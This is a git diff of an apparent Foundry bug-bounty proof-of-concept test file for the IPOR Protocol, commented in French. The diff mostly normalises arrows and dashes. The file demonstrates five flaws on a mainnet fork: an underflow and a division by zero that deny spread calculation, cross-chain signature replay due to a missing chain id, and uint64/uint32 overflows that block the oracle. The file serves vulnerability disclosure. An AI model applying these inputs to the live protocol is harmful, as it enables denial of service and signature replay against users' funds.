@@ -10,7 +10,7 @@ import "../../contracts/interfaces/types/IporTypes.sol";
 import "../../contracts/libraries/RiskIndicatorsValidatorLib.sol";
 import "../../contracts/interfaces/types/AmmTypes.sol";
 
-/// @title PoC Bug Bounty — IPOR Protocol
+/// @title PoC Bug Bounty -- IPOR Protocol
 /// @notice Preuves d'exploitation pour les failles CRITIQUES et HIGH confirmees
 /// @dev Executer avec : forge test --fork-url $ETHEREUM_PROVIDER_URL --match-path test/fork/PoC_BugBounty.t.sol -vvvv
 contract PoC_BugBounty is Test {
@@ -30,13 +30,13 @@ contract PoC_BugBounty is Test {
     }
 
     // =========================================================================
-    // PoC #1 — CRITIQUE : Underflow dans calculateLpDepth → DoS spread global
+    // PoC #1 -- CRITIQUE : Underflow dans calculateLpDepth -> DoS spread global
     // Fichier vulnerable : contracts/amm/spread/CalculateTimeWeightedNotionalLibs.sol:17-23
     //                      contracts/base/spread/CalculateTimeWeightedNotionalLibsBaseV1.sol:13-23
     // =========================================================================
 
     /// @notice Demontre que le calcul normal fonctionne (reference)
-    function test_PoC1_Normal_Works() public view {
+    function test_PoC1_Normal_Works() public {
         IporTypes.SpreadInputs memory normalInputs = IporTypes.SpreadInputs({
             asset: USDT,
             swapNotional: 0,
@@ -44,12 +44,12 @@ contract PoC_BugBounty is Test {
             baseSpreadPerLeg: 0,
             totalCollateralPayFixed:    100_000e18,  // 100k
             totalCollateralReceiveFixed: 50_000e18,  // 50k
-            liquidityPoolBalance:     1_000_000e18,  // 1M LP — suffisant
+            liquidityPoolBalance:     1_000_000e18,  // 1M LP -- suffisant
             iporIndexValue: 5e15,
             fixedRateCapPerLeg: 5e16
         });
 
-        // lpDepth = 1_000_000 + 50_000 - 100_000 = 950_000 > 0 → OK
+        // lpDepth = 1_000_000 + 50_000 - 100_000 = 950_000 > 0 -> OK
         uint256 spread = ISpread28DaysLens(SPREAD_ROUTER)
             .calculateOfferedRatePayFixed28Days(normalInputs);
 
@@ -59,21 +59,21 @@ contract PoC_BugBounty is Test {
 
     /// @notice Demontre le DoS par underflow arithmetique
     /// Condition : totalCollateralPayFixed > liquidityPoolBalance + totalCollateralReceiveFixed
-    /// Solidity 0.8.26 checked arithmetic → Panic(0x11) → revert
+    /// Solidity 0.8.26 checked arithmetic -> Panic(0x11) -> revert
     function test_PoC1_Underflow_DoS_CRITIQUE() public {
-        console2.log("=== PoC #1 : Underflow calculateLpDepth → DoS ===");
+        console2.log("=== PoC #1 : Underflow calculateLpDepth -> DoS ===");
         console2.log("Vulnerable : CalculateTimeWeightedNotionalLibs.sol:19");
         console2.log("Condition  : totalCollateralPayFixed > liquidityPoolBalance + totalCollateralReceiveFixed");
-        console2.log("Calcul     : 500e18 + 50e18 - 600e18 = -50e18 → Panic(0x11)");
+        console2.log("Calcul     : 500e18 + 50e18 - 600e18 = -50e18 -> Panic(0x11)");
 
         IporTypes.SpreadInputs memory maliciousInputs = IporTypes.SpreadInputs({
             asset: USDT,
             swapNotional: 1e18,
             demandSpreadFactor: 1000,
             baseSpreadPerLeg: 0,
-            totalCollateralPayFixed:    600e18,  // ← leg dominante
+            totalCollateralPayFixed:    600e18,  // <- leg dominante
             totalCollateralReceiveFixed: 50e18,  // gap = 550e18
-            liquidityPoolBalance:       500e18,  // ← LP < gap (500 < 550) → UNDERFLOW
+            liquidityPoolBalance:       500e18,  // <- LP < gap (500 < 550) -> UNDERFLOW
             iporIndexValue: 5e15,
             fixedRateCapPerLeg: 5e16
         });
@@ -95,8 +95,8 @@ contract PoC_BugBounty is Test {
             demandSpreadFactor: 1000,
             baseSpreadPerLeg: 0,
             totalCollateralPayFixed:     50e18,  // leg mineure
-            totalCollateralReceiveFixed: 600e18, // ← leg dominante
-            liquidityPoolBalance:        500e18,  // 500 + 50 - 600 = -50 → UNDERFLOW
+            totalCollateralReceiveFixed: 600e18, // <- leg dominante
+            liquidityPoolBalance:        500e18,  // 500 + 50 - 600 = -50 -> UNDERFLOW
             iporIndexValue: 5e15,
             fixedRateCapPerLeg: 5e16
         });
@@ -135,7 +135,7 @@ contract PoC_BugBounty is Test {
     }
 
     // =========================================================================
-    // PoC #2 — CRITIQUE : Division par zero quand lpDepth == 0
+    // PoC #2 -- CRITIQUE : Division par zero quand lpDepth == 0
     // Fichier vulnerable : contracts/base/spread/DemandSpreadStableLibsBaseV1.sol:137
     //                      contracts/amm/spread/DemandSpreadLibs.sol:
     // =========================================================================
@@ -151,17 +151,17 @@ contract PoC_BugBounty is Test {
         // lpDepth = 0 exactement : 500e18 + 50e18 - 550e18 = 0
         IporTypes.SpreadInputs memory edgeInputs = IporTypes.SpreadInputs({
             asset: USDT,
-            swapNotional: 100e18,    // ← force la branche calculateSpreadFunction
+            swapNotional: 100e18,    // <- force la branche calculateSpreadFunction
             demandSpreadFactor: 1000,
             baseSpreadPerLeg: 0,
             totalCollateralPayFixed:    550e18,
             totalCollateralReceiveFixed: 50e18,
-            liquidityPoolBalance:       500e18,  // 500 + 50 = 550 = totalPayFixed → lpDepth = 0
+            liquidityPoolBalance:       500e18,  // 500 + 50 = 550 = totalPayFixed -> lpDepth = 0
             iporIndexValue: 5e15,
             fixedRateCapPerLeg: 5e16
         });
 
-        // division(swapNotional * 1e18, maxNotional=0) → Panic division by zero
+        // division(swapNotional * 1e18, maxNotional=0) -> Panic division by zero
         vm.expectRevert();
         ISpread28DaysLens(SPREAD_ROUTER)
             .calculateOfferedRatePayFixed28Days(edgeInputs);
@@ -170,13 +170,13 @@ contract PoC_BugBounty is Test {
     }
 
     // =========================================================================
-    // PoC #3 — HIGH : Signature RiskIndicators sans block.chainid
+    // PoC #3 -- HIGH : Signature RiskIndicators sans block.chainid
     // Fichier vulnerable : contracts/libraries/RiskIndicatorsValidatorLib.sol:36-51
     // =========================================================================
 
     /// @notice Demontre que le hash de signature est identique sur deux chaines differentes
     /// car block.chainid n'est pas inclus dans le hash
-    function test_PoC3_SignatureReplay_NoChaindId_HIGH() public view {
+    function test_PoC3_SignatureReplay_NoChaindId_HIGH() public {
         console2.log("=== PoC #3 : Signature replay cross-chain ===");
         console2.log("Vulnerable : RiskIndicatorsValidatorLib.sol:36-51");
         console2.log("Probleme   : block.chainid absent du hash");
@@ -205,11 +205,11 @@ contract PoC_BugBounty is Test {
             asset,
             tenor,
             direction
-            // ← block.chainid ABSENT (chainId Ethereum = 1)
+            // <- block.chainid ABSENT (chainId Ethereum = 1)
         ));
 
         // Simulation : memes parametres sur Arbitrum (chainId = 42161)
-        // Le code ne change pas → hash identique
+        // Le code ne change pas -> hash identique
         bytes32 hashArbitrum = keccak256(abi.encodePacked(
             maxCollateralRatio,
             maxCollateralRatioPerLeg,
@@ -218,7 +218,7 @@ contract PoC_BugBounty is Test {
             fixedRateCapPerLeg,
             demandSpreadFactor,
             expiration,
-            asset,   // ← si meme adresse deployee sur Arbitrum
+            asset,   // <- si meme adresse deployee sur Arbitrum
             tenor,
             direction
         ));
@@ -228,34 +228,35 @@ contract PoC_BugBounty is Test {
         console2.log("Hash Arbitrum  :");
         console2.logBytes32(hashArbitrum);
 
-        // PREUVE : les deux hashs sont identiques → meme signature valide sur les deux chaines
+        // PREUVE : les deux hashs sont identiques -> meme signature valide sur les deux chaines
         assertEq(hashEthereum, hashArbitrum,
-            "CONFIRME: Hash identique cross-chain → replay de signature possible");
+            "CONFIRME: Hash identique cross-chain -> replay de signature possible");
 
         console2.log("[CONFIRME] Signature valide sur Ethereum est rejouable sur Arbitrum");
         console2.log("[MITIGATION] Ajouter block.chainid dans abi.encodePacked()");
     }
 
     // =========================================================================
-    // PoC #4 — HIGH : Overflow uint64 indexValue → DoS oracle si taux > 1840%
+    // PoC #4 -- HIGH : Overflow uint64 indexValue -> DoS oracle si taux > 1840%
     // Fichier vulnerable : contracts/oracles/IporOracle.sol:284
     // =========================================================================
 
     /// @notice Demontre la limite du uint64 pour l'indexValue de l'oracle
-    /// Preuve mathematique : uint64 max en WAD = 18.4 → au-dela l'oracle est bloque
+    /// Preuve mathematique : uint64 max en WAD = 18.4 -> au-dela l'oracle est bloque
     function test_PoC4_Uint64Overflow_OracleDoS_HIGH() public {
         console2.log("=== PoC #4 : Oracle DoS par overflow uint64 ===");
-        console2.log("Vulnerable : IporOracle.sol:284 — indexValue.toUint64()");
+        console2.log("Vulnerable : IporOracle.sol:284 -- indexValue.toUint64()");
 
         uint256 uint64Max = type(uint64).max; // 18_446_744_073_709_551_615
 
         // PREUVE : limite mathematique en WAD (18 decimales)
         uint256 maxRateInWad = uint64Max / 1e18;  // = 18 (soit 1800%)
-        // Valeur exacte : 18_446_744_073 (milliards de WAD units) → 18.446... WAD
+        // Valeur exacte : 18_446_744_073 (milliards de WAD units) -> 18.446... WAD
         uint256 maxRateRemainder = uint64Max % 1e18;
 
         console2.log("uint64 max              :", uint64Max);
-        console2.log("Taux max en WAD         :", maxRateInWad, "entier +", maxRateRemainder, "/ 1e18");
+        console2.log("Taux max en WAD (entier):", maxRateInWad);
+        console2.log("Taux max WAD remainder  :", maxRateRemainder);
         console2.log("Taux max en pourcentage :", maxRateInWad * 100, "% (environ 1840%)");
 
         // ASSERTION : tout taux >= 18.447 WAD deborde uint64
@@ -266,7 +267,7 @@ contract PoC_BugBounty is Test {
         // Source : contracts/oracles/IporOracle.sol:284
         // _indexes[asset] = IporOracleTypes.IPOR(
         //     newQuasiIbtPrice.toUint128(),
-        //     indexValue.toUint64(),     ← REVERT si indexValue > uint64.max
+        //     indexValue.toUint64(),     <- REVERT si indexValue > uint64.max
         //     updateTimestamp.toUint32()
         // );
         // SafeCast (OZ) : require(value <= type(uint64).max, "SafeCast: value doesn't fit in 64 bits")
@@ -276,17 +277,17 @@ contract PoC_BugBounty is Test {
         assertTrue(reverts, "SafeCast.toUint64() doit revert pour valeur > uint64.max");
 
         console2.log("[CONFIRME] toUint64() revert si taux IPOR > 1840%");
-        console2.log("[IMPACT] Oracle bloque definitivement — plus de mise a jour possible");
+        console2.log("[IMPACT] Oracle bloque definitivement -- plus de mise a jour possible");
     }
 
     // =========================================================================
-    // PoC #5 — HIGH : Overflow uint32 timestamp → DoS oracle en 2106
+    // PoC #5 -- HIGH : Overflow uint32 timestamp -> DoS oracle en 2106
     // Fichier vulnerable : contracts/oracles/IporOracle.sol:207, 284
     // =========================================================================
 
     function test_PoC5_Uint32Timestamp_OracleDoS_2106_HIGH() public {
         console2.log("=== PoC #5 : Oracle DoS timestamp uint32 en 2106 ===");
-        console2.log("Vulnerable : IporOracle.sol:207 et :284 — updateTimestamp.toUint32()");
+        console2.log("Vulnerable : IporOracle.sol:207 et :284 -- updateTimestamp.toUint32()");
 
         uint32 uint32Max = type(uint32).max; // 4_294_967_295
 
@@ -295,7 +296,7 @@ contract PoC_BugBounty is Test {
         console2.log("Date limite             : 7 fevrier 2106 (Unix timestamp = 4294967295)");
         console2.log("Timestamp fork actuel   :", block.timestamp);
 
-        // La limite est dans le futur — bien qu'eloignee, elle est incontournable
+        // La limite est dans le futur -- bien qu'eloignee, elle est incontournable
         assertTrue(uint32Max > block.timestamp, "La limite uint32 est dans le futur");
         console2.log("Secondes avant overflow :", uint32Max - block.timestamp);
 
@@ -309,23 +310,23 @@ contract PoC_BugBounty is Test {
 
         // PREUVE que le code vulnerable utilise SafeCast.toUint32()
         // Source : contracts/oracles/IporOracle.sol:207 et :284
-        // updateTimestamp.toUint32()  ← REVERT apres le 7 fevrier 2106
+        // updateTimestamp.toUint32()  <- REVERT apres le 7 fevrier 2106
 
         console2.log("[CONFIRME] toUint32() revert apres 2106");
         console2.log("[IMPACT] Oracle bloque definitivement apres le 7 fevrier 2106");
     }
 }
 
-/// @dev Wrapper externe pour tester SafeCast — vm.expectRevert() requiert un appel externe
+/// @dev Wrapper externe pour tester SafeCast -- vm.expectRevert() requiert un appel externe
 contract SafeCastWrapper {
-    function testToUint64Reverts(uint256 value) external pure returns (bool) {
+    function testToUint64Reverts(uint256 value) external returns (bool) {
         (bool success, ) = address(this).staticcall(
             abi.encodeWithSignature("_castToUint64(uint256)", value)
         );
         return !success; // true si le cast a revert (= comportement attendu)
     }
 
-    function testToUint32Reverts(uint256 value) external pure returns (bool) {
+    function testToUint32Reverts(uint256 value) external returns (bool) {
         (bool success, ) = address(this).staticcall(
             abi.encodeWithSignature("_castToUint32(uint256)", value)
         );
